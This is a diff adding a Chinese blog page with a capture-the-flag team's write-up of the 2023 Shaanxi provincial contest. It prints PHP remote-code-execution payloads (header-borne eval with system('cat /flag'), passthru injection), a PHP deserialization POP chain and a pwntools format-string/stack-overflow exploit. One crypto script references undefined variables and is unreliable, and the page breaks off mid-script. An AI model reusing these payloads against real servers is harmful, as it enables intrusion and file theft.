@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>2023陕西省赛 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="可燃冰战队 WriteUp排名可燃冰：第42名  解题思路WEBEzRCEkey传入admin获取源码，分析代码发现&#x2F;hahaha&#x2F;是正则表达式，表示要匹配的字符串为”hahaha”；&#x2F;e是preg_replace函数的模式参数，表示替换字符串时要将替换字符串作为PHP代码执行；qaq是一个变量，表示要替换成的值；name是要进行替换的原始字符串，$name1是替换后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023陕西省赛">
+<meta property="og:url" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="可燃冰战队 WriteUp排名可燃冰：第42名  解题思路WEBEzRCEkey传入admin获取源码，分析代码发现&#x2F;hahaha&#x2F;是正则表达式，表示要匹配的字符串为”hahaha”；&#x2F;e是preg_replace函数的模式参数，表示替换字符串时要将替换字符串作为PHP代码执行；qaq是一个变量，表示要替换成的值；name是要进行替换的原始字符串，$name1是替换后">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603161709875.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603151503173.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155209421.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155714227.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155802643.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155833418.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155910234.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155919456.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603160013974.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603161531504.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603182101684.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185926159.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185942074.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190043963.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190028841.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190102061.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190113173.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185725422.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185655860.png">
+<meta property="og:image" content="file:///C:/Users/86186/AppData/Local/Temp/msohtmlclip1/01/clip_image006.gif">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185706240.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185625545.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185614952.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185558087.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185434220.png">
+<meta property="og:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185533883.png">
+<meta property="article:published_time" content="2023-07-02T02:07:09.000Z">
+<meta property="article:modified_time" content="2023-07-02T02:16:59.738Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603161709875.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="touxiang/t.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="touxiang/t.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-2023陕西省赛" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/" class="article-date">
+  	<time datetime="2023-07-02T02:07:09.000Z" itemprop="datePublished">2023-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2023陕西省赛
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="可燃冰战队-WriteUp"><a href="#可燃冰战队-WriteUp" class="headerlink" title="可燃冰战队 WriteUp"></a>可燃冰战队 WriteUp</h1><h2 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h2><p>可燃冰：第42名</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603161709875.png" alt="image-20230603161709875"></p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="EzRCE"><a href="#EzRCE" class="headerlink" title="EzRCE"></a>EzRCE</h4><p>key传入admin获取源码，分析代码发现&#x2F;hahaha&#x2F;是正则表达式，表示要匹配的字符串为”hahaha”；&#x2F;e是preg_replace函数的模式参数，表示替换字符串时要将替换字符串作为PHP代码执行；qaq是一个变量，表示要替换成的值；name是要进行替换的原始字符串，$name1是替换后的结果。</p>
+<p>经过多次测试发现无参数rce可行，读取出waf.php内容</p>
+<p>然后发现过滤许多函数，并且普通读取flag的时候无法读取，有Linux权限限制，看到禁用的函数和apache环境，于是猜测使用apache_request_headers()</p>
+<p>所以只要post传入：</p>
+<p>name&#x3D;hahaha&amp;qaq&#x3D;eval(array_rand(array_flip(apache_request_headers())))</p>
+<p>请求头添加</p>
+<p>H: system(&amp;apos;cat &#x2F;flag&amp;apos;);</p>
+<p>Get传入</p>
+<p>?key&#x3D;admin</p>
+<p>多传几次或放爆破模块里获得flag,最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?key=admin HTTP/1.1</span><br><span class="line">Host: 4744404a.clsadp.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 70</span><br><span class="line">H: system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">name=hahaha&amp;qaq=eval(array_rand(array_flip(apache_request_headers())))</span><br></pre></td></tr></table></figure>
+
+<h4 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h4><p>这题上来点,发现点不动,看js代码发现<img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603151503173.png" alt="image-20230603151503173"></p>
+<p>解出来&#x2F;pop3ZTgMw.php,开始分析代码,解题时发现pop链很简单,但无法执行,底部还有一段报错.</p>
+<p>搜了一下发现是php的GC回收机制的原因,无法调用__destruct()方法,解决办法是让属性个数加一.</p>
+<p>所以编写pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class night</span><br><span class="line">&#123;</span><br><span class="line">    public $night;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">        $this-&gt;night = new day();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class day</span><br><span class="line">&#123;</span><br><span class="line">    public $day;</span><br><span class="line">&#125;</span><br><span class="line">class light</span><br><span class="line">&#123;</span><br><span class="line">    public $light;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">        $this-&gt;light = new day;</span><br><span class="line">		$this-&gt;light-&gt;day= new dark;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dark</span><br><span class="line">&#123;</span><br><span class="line">    public $dark=&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new night();</span><br><span class="line">$b=new day();</span><br><span class="line">$c=new light();</span><br><span class="line">$d=new dark();</span><br><span class="line">$a-&gt;night=$b;</span><br><span class="line">$b-&gt;day=$d;</span><br><span class="line">$d-&gt;dark=$c;</span><br><span class="line"></span><br><span class="line">echo (((serialize($a))));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;night&quot;:2:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:54:&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有一个坑就是直接post一个pop不对,有不可见字符,在vscode里能看到</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155209421.png" alt="image-20230603155209421"></p>
+<p>要一起post传上去才行</p>
+<h4 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h4><p>这一题在传参时测出来了非预期解,使用passthru能命令执行</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=passthru (&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="可是雪啊飘进双眼"><a href="#可是雪啊飘进双眼" class="headerlink" title="可是雪啊飘进双眼"></a>可是雪啊飘进双眼</h4><p>音频后半段有摩斯密码</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155714227.png" alt="image-20230603155714227"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-- --- .- .. ... .... .- -. -..- ..</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155802643.png" alt="image-20230603155802643"></p>
+<p>然后用SNOW  </p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155833418.png" alt="image-20230603155833418"></p>
+<p>得到压缩包密码</p>
+<p>压缩包里面key.jpg有隐藏文件</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155910234.png" alt="image-20230603155910234"></p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603155919456.png" alt="image-20230603155919456"></p>
+<p>对照密码表得到密码</p>
+<p>BC1PVEYD</p>
+<p>然后用steghide</p>
+<p>得到flag  </p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603160013974.png" alt="image-20230603160013974"></p>
+<h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>lsb</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603161531504.png" alt="image-20230603161531504"></p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="HaM3"><a href="#HaM3" class="headerlink" title="HaM3"></a>HaM3</h4><p>这题找到了原题<a target="_blank" rel="noopener" href="https://blog.cryptohack.org/cryptoctf2021-easy#hamul">CryptoCTF 2021 - Easy | CryptoHack Blog</a></p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603182101684.png" alt="image-20230603182101684"></p>
+<p>差不太多,加一层爆破就跑出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 142672086626283587048017713116658568907056287246536918432205313755474498483915485435443731126588499776739329317569276048159601495493064346081295993762052633</span><br><span class="line"></span><br><span class="line">high = str(n)[:18]</span><br><span class="line">low = str(n)[-18:]</span><br><span class="line">pq=[]</span><br><span class="line">for i in range(10):</span><br><span class="line">for j in range(10):</span><br><span class="line">for z in range(10):</span><br><span class="line">pq.append(int(high + str(i) + str(j) +str(z) + low))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for x in pq:</span><br><span class="line">f = factor(x)</span><br><span class="line">if (len(f) == 2 and f[0][0].nbits() == 64):</span><br><span class="line">p, q = f[0][0], f[1][0]</span><br><span class="line">print(p,q)</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">p,q = 9937378783676979077,14357114660923972229</span><br><span class="line">c = 35771468551700967499031290145813826705314774357494021918317304230766070868171631520643911378972522363861624359732252684003796428570328730483253546904382041</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">PP = int(str(int(str(p) + str(q))) + str(int(str(q) + str(p))))</span><br><span class="line">QQ = int(str(Q) + str(P))</span><br><span class="line">d = inverse(e,(PP-1)*(QQ-1))</span><br><span class="line">m = pow(c,d,PP*QQ)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="陕西游玩"><a href="#陕西游玩" class="headerlink" title="陕西游玩"></a>陕西游玩</h4><p>首先checksec看一下</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185926159.png" alt="image-20230603185926159"></p>
+<p>主要的是pie保护。</p>
+<p>IDA打开看看，</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185942074.png" alt="IMG_259"></p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190043963.png" alt="image-20230603190043963"></p>
+<p>发现程序是有三个函数，1；2；3选择进入</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190028841.png" alt="image-20230603190028841"></p>
+<p>huashan是一个溢出点，</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190102061.png" alt="image-20230603190102061"></p>
+<p>terra是一个格式化字符串漏洞。</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603190113173.png" alt="image-20230603190113173"></p>
+<p>xi_an有一个gadgets。</p>
+<p>现在就有了思路，首先格式化字符串泄露main函数真实地址，求出基地址，找到gadgets的真实地址，然后栈溢出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&quot;121.196.192.181&quot;,10001)</span><br><span class="line">#p=process(&quot;./kj&quot;)</span><br><span class="line">elf=ELF(&#x27;./kj&#x27;)</span><br><span class="line">context(log_level = &#x27;debug&#x27;,arch = &#x27;amd64&#x27;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;Your choice :\n&quot;)</span><br><span class="line">p.sendline(b&#x27;2&#x27;)</span><br><span class="line">p.recvuntil(b&quot;Welcome to Terra_Cotta_Warriors\n&quot;)</span><br><span class="line">p.send(b&#x27;%19$p&#x27;)</span><br><span class="line">base=int(p.recv(14),16)-0x12eb</span><br><span class="line">print(&quot;base=&quot;,hex(base))</span><br><span class="line">docker=base+0x129A</span><br><span class="line">p.recvuntil(b&quot;Your choice :\n&quot;)</span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.recvuntil(b&quot;Welcome to Huashan_Mountain\n&quot;)</span><br><span class="line">payload=b&#x27;a&#x27;*0x28+p64(docker)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="我的upx-d怎么坏了"><a href="#我的upx-d怎么坏了" class="headerlink" title="我的upx -d怎么坏了"></a>我的upx -d怎么坏了</h4><p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185725422.png" alt="image-20230603185725422"><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45986910/article/details/107993680">https://blog.csdn.net/weixin_45986910/article/details/107993680</a></p>
+<p>手脱壳参照的博客。</p>
+<p>脱壳之后用ida32打开<br><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185655860.png" alt="image-20230603185655860"></p>
+<p> 一眼丁真迷宫题，静态分析了一下<img src="file:///C:/Users/86186/AppData/Local/Temp/msohtmlclip1/01/clip_image006.gif" alt="img"></p>
+<p>可以看出来是一个15*15的迷宫，直接写脚本画出迷宫</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185706240.png" alt="image-20230603185706240"><br> 看提示是最短路径，</p>
+<p>那应该是“RRRDRRURRRRRRDDDDRDDDflag”</p>
+<p>flag为这串字符的md5 32位小写。</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185625545.png" alt="image-20230603185625545"><br> 接下来先base解密，然后减3异或8即可rs3 &#x3D; “qglrv@onmlqpA&gt;qmq&gt;mBo3A?Bn&lt;lppA@;lp4nx”rs4 &#x3D; “”for i in range(len(rs3)):  rs4 +&#x3D; chr((ord(rs3[i]) - 3) ^ 8)print(rs4)<br><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185614952.png" alt="image-20230603185614952"></p>
+<h4 id="babypython"><a href="#babypython" class="headerlink" title="babypython"></a>babypython</h4><p>划到最下面会看见一个类似base64编码的字符</p>
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185558087.png" alt="image-20230603185558087"></p>
+<p>首先把这串字符串1换成g,3换成H,9换成W，然后倒序，然后base64解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">mapping = &#123;&quot;1&quot;: &quot;g&quot;, &quot;3&quot;: &quot;H&quot;, &quot;9&quot;: &quot;W&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = input(&quot;请输入要处理的字符串：&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for old_char, new_char in mapping.items():</span><br><span class="line">    input_str = input_str.replace(old_char, new_char)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = input_str[::-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decoded_str = base64.b64decode(input_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;处理后的字符串为：&quot;,decoded_str)</span><br><span class="line">#qglrv@onmlqpA&gt;qmq&gt;mBo3A?Bn&lt;lppA@;lp4nx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/07/02/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/image-20230603185434220.png" alt="image-20230603185434220"></p>
+<p>然后把得到的字符串减3最后再异或8。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 获取输入字符串</span><br><span class="line">input_str = input(&quot;请输入要处理的字符串：&quot;)</span><br><span class="line"></span><br><span class="line"># 初始化输出字符串</span><br><span class="line">output_str = &quot;&quot;</span><br><span class="line"></span><br><span class="line">\# 遍历输入字符串中的每个字符并将其先减3再异或8</span><br><span class="line"></span><br><span class="line">for char in input_str:</span><br><span class="line"></span><br><span class="line">  \# 将字符转换为ASCII码，减去3，异或8，然后将结果转换回字符</span><br><span class="line"></span><br><span class="line">  new_char = chr((ord(char) - 3) ^ 8)</span><br><span class="line"></span><br><span class="line">  \# 